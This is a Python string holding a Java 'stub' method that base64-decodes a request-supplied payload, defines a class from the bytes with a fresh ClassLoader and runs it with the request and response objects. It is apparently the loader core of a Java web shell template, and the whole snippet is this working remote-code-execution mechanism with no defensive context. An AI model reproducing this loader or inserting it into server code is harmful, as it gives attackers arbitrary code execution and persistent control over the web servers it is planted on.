code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = decoder(payload);
        byte[] b = b64decode(payload);
        this.getClass().getConstructor(ClassLoader.class)
                .newInstance(this.getClass().getClassLoader())
                .defineClass(b, 0, b.length).newInstance()
                .equals(new Object[]{request,response});
        return null;
    }
"""